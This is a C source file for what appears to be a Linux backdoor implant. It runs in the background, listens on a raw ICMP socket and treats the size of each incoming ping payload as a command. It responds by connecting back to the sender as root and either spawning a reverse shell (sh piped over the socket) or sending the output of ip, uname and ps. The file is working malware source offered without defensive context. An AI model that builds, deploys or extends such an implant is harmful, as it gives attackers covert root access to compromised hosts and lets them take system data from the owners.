#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <poll.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <netinet/ip.h>
#include <netdb.h>
#include <stdlib.h>
#include <error.h>
#include <errno.h>
#include <wait.h>
#include <limits.h>
#include <arpa/inet.h>


#include "core/headers/agent_commands.h"
#include "core/headers/network_helper.h"
#include "core/headers/factory.h"



////////////////////////////////////////////////// typedefs


typedef void (*exec_hook)(void);


////////////////////////////////////////////////// globals


struct factory *commands;


////////////////////////////////////////////////// commands


int exec_and_send(char ipAddress[], exec_hook hook)
{
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    chdir("/");
    int sockfd = 0, n = 0;
    struct sockaddr_in serv_addr;
    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        return 1;
    }
    memset(&serv_addr, '0', sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(REVERSE_SHELL_PORT);
    if(inet_pton(AF_INET, ipAddress, &serv_addr.sin_addr)<=0)
    {
        return 1;
    }
    if( connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    {
        return 1;
    }

    if (!fork()) {
        /* connect the socket to process sdout, stdin and stderr */
        dup2(sockfd, 0);
        dup2(sockfd, 1);
        dup2(sockfd, 2);
        hook();
    } else {
        wait(NULL);
        close(sockfd);
    }
}


void exec_shell_hook() {
    execve("/usr/bin/sh", (char *[]){"sh", NULL}, NULL);
}


void get_shell(int argc, char *argv[])
{
    char *ipAddress = argv[1];
    exec_and_send(ipAddress, exec_shell_hook);
}


void exec_ip_hook() {
    execve("/usr/sbin/ip", (char *[]){"ip", "a", NULL}, NULL);
}


void get_ip(int argc, char *argv[])
{
    char *ipAddress = argv[1];
    exec_and_send(ipAddress, exec_ip_hook);
}


void exec_uname_hook() {
    execve("/usr/bin/uname", (char *[]){"uname", "-a", NULL}, NULL);
}


void get_uname(int argc, char *argv[])
{
    char *ipAddress = argv[1];
    exec_and_send(ipAddress, exec_uname_hook);
}


void exec_ps_hook() {
    execve("/usr/bin/ps", (char *[]){"ps", "-aux", NULL}, NULL);
}


void get_ps(int argc, char *argv[])
{
    char *ipAddress = argv[1];
    printf("get ps [%s]\n", ipAddress);
    exec_and_send(ipAddress, exec_ps_hook);
}


char *itoa(int num) {
    char *c = malloc(16);
    snprintf(c, 16, "%d", num);
    return c;
}


void invoke_commands(struct sockaddr_in from, int size) {
    char *ipAddress = malloc(INET_ADDRSTRLEN);
    inet_ntop(AF_INET, &(from.sin_addr.s_addr), ipAddress, INET_ADDRSTRLEN);

    printf("[%d] incomming -> src: %s, payload size: %d\n", getpid(), ipAddress, size);

    char *command = itoa(size - 28);
    maker c = make(commands, command);

    if (c != NULL) {
        int argc = 2;
        char *argv[] = {command, ipAddress};

        c(argc, argv);
    }
}


void fill_factory() {
    register_item(commands, itoa(AGENT_IP_CMD), get_ip);
    register_item(commands, itoa(AGENT_SHELL_CMD), get_shell);
    register_item(commands, itoa(AGENT_UNAME_CMD), get_uname);
    register_item(commands, itoa(AGENT_PS_CMD), get_ps);
}


////////////////////////////////////////////////// main


int main(int argc, char *argv[])
{
    int s, size, fromlen;
    char pkt[4096];
    struct protoent *proto;
    struct sockaddr_in from;

    // run in background
    if (fork() != 0) exit(0);

    // init command factory
    build_factory(&commands);
    fill_factory();

    proto = getprotobyname("icmp");

    if ((s = socket(AF_INET, SOCK_RAW, proto->p_proto)) < 0)
    {
        /* can't create raw socket */
        printf("err: %d\n", errno);
        exit(0);
    }

    /* waiting for packets */
    while(1)
    {
        while (1)
        {
            fromlen = sizeof(from);
            printf("[%d] waiting for connection\n", getpid());

            if ((size = recvfrom(s, pkt, sizeof(pkt), 0, (struct sockaddr *) &from, &fromlen)) < 0)
            {
                printf("ping of %i\n", size-28);
            }
            
            invoke_commands(from, size);
        }
        
        sleep(15);
    }
}